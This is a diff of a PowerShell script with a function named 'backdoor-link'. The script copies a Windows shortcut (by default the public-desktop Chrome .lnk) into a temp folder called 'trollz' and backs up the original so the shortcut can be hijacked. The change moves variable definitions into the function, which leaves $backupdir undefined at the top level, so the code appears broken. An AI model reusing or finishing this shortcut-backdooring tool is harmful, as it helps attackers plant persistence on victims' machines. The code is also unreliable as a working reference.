@@ -8,14 +8,8 @@
 .EXAMPLE
    Another example of how to use this cmdlet
 #>
-Param
-    (
-        $sourcepath = 'C:\Users\Public\Desktop\Google Chrome.lnk' #defaults to public chrome install
-    )
-$fname = (gci $sourcepath | Select-Object -First 1).name
+
 $destination = $env:HOMEPATH + "\AppData\Local\Temp\trollz\"
-$backupdir = $destination + "linkbackup\"
-$shortcutname = $destination + $fname
 
 if (Test-Path $destination){Write-Host "$destination is hurr"}
     else {mkdir $destination}
@@ -24,7 +18,9 @@ if (Test-Path $backupdir){Write-Host "$backupdir is hurr"}
     else {mkdir $backupdir}
 
 function backdoor-link($sourcepath, $destination){
-
+    $fname = (gci $sourcepath | Select-Object -First 1).name
+    $backupdir = $destination + "linkbackup\"
+    $shortcutname = $destination + $fname
     #copy link to temp dir and store target values
     Copy-Item $sourcepath $destination  ## Get the lnk we want to use as a template
     Copy-Item $sourcepath $backupdir  ## backup origional link in a restore directory
